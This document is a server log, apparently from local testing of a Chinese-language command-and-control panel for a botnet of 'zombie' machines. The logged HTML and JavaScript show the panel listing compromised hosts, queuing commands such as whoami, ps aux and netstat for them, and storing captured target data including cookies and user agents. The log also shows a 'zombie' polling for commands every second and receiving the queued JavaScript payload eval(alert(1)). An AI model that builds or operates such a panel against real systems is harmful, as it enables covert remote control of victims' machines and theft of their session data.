class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-25T03:25:06.035Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-25 11:25:06.039456</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 11:26:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:21] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-25 11:26:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:21] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-25 11:26:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:21] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 11:26:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:21 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:22 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:23 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:24 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-25 11:26:24 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-25 11:26:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-25 11:26:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:24] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-25 11:26:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:25 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:26 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:27 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:29 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:30 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:31 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:32 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:26:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_command_to_do(zombie_ip='127.0.0.1')
2025-06-25 11:26:33 | INFO     | control_route.py:197 | add_command_to_do() | 用戶請求為殭屍機器 127.0.0.1 添加命令
2025-06-25 11:26:33 | INFO     | control_route.py:225 | add_command_to_do() | 成功為殭屍機器 127.0.0.1 添加命令: eval(alert(1))
2025-06-25 11:26:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_command_to_do 執行完畢 (耗時: 0.0042s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 11:26:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:33] "[32mPOST /api/control/add_command_to_do/127.0.0.1 HTTP/1.1[0m" 302 -
2025-06-25 11:26:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 11:26:33 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-25 11:26:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0010s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        <div class="container mt-4">\n            \n            <div class="alert alert-success alert-dismissible fade show" role="alert">\n                成功為 127.0.0.1 添加命令！\n                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>\n            </div>\n            \n        </div>\n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    <div class="flash-messages">\n        \n        <div class="flash-message success">\n            成功為 127.0.0.1 添加命令！\n            <button class="close-btn" onclick="this.parentElement.style.display=\'none\'">&times;</button>\n        </div>\n        \n    </div>\n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-25T03:25:06.035Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-25 11:25:06.039456</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 11:26:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:33] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-25 11:26:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:34 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:35 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:36 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:37 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:39 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:40 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
